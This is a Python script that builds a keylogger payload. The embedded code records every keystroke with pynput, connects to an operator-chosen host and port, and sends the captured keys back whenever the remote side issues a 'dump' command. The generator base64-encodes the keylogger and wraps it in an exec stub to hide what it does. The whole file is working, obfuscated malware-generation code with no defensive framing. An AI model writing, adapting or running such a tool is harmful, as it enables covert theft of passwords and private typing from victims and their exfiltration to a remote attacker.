from sys import argv, exit
from time import sleep
from os import path
import base64

def writeFile(filename, host, port):
    filename = 'output/%s'%filename
    code = '''from pynput.keyboard import Key, Listener\nfrom socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os, time\nkeyLog = ""\ncmd = ""\nhost = '%s'\nport = %i\n\ndef on_press(key):\n\tglobal keyLog\n\tkeyLog+=str(key).replace("'","").replace('Key.space',' ').replace('Key.ctrl_l','<ctrl>').replace('Key.shift','<shift>').replace('Key.enter','\\n').replace('Key.backspace',' <bck>').replace('Key.esc','<esc>')\n\tif cmd == 'dump' or cmd == 'stop':\n\t\treturn False\n\ndef dump():\n\tglobal keyLog\n\tdump = keyLog.replace('<shift>1','!').replace('<shift>2','@').replace('<shift>3','#').replace('<shift>4','$').replace('<shift>5','%%').replace('<shift>7','&').replace('<shift>8','*').replace('<shift>9','(').replace('<shift>0',')')\n\tkeyLog = ""\n\treturn dump\n\ndef stop():\n\tlistener.stop()\n\ndef start():\n\tglobal listener\n\tlistener = Listener(on_press=on_press)\n\tlistener.start()\n\ndef main(host, port):\n\ts = socket(AF_INET, SOCK_STREAM)\n\ts.connect((host, port))\n\twhile 1:\n\t\tcmd = str(s.recv(2048))\n\t\tcmd = cmd[1:].replace("'","")\n\n\t\tresponse = ''\n\t\tif cmd == "start":\n\t\t\tstart()\n\t\t\tresponse = 'Started!'\n\t\t\tprint(response)\n\t\tif cmd == "dump":\n\t\t\tresponse = dump()\n\t\tif cmd == 'stop':\n\t\t\tstop()\n\t\t\tresponse = 'Stoped!'\n\t\ts.send(str.encode(response))\n\nmain(host,port)\n''' %(host,port)
    code = base64.b64encode(str.encode(code))
    lines = ['import base64','\n',"code=%s"%bytes(code),'\n','exec(base64.b64decode(code))']
    outFile = open(filename,'w')

    outFile.writelines(lines)
    #outFile.write(code)

    outFile.close()
    size = path.getsize(filename)
    print('Payload written to: %s'%filename)
    print('Size: %ikb'%(size))


def main():
    if len(argv) >= 4:
        filename = str(argv[1])
        host = str(argv[2])
        port = int(argv[3])
    else:
        print('Usage: genClient.py <filename> <host> <port>')
        exit()
    print('[*] Writing payload to %s using host %s:%i'%(filename,host,port))
    sleep(1)
    writeFile(filename,host,port)

main()
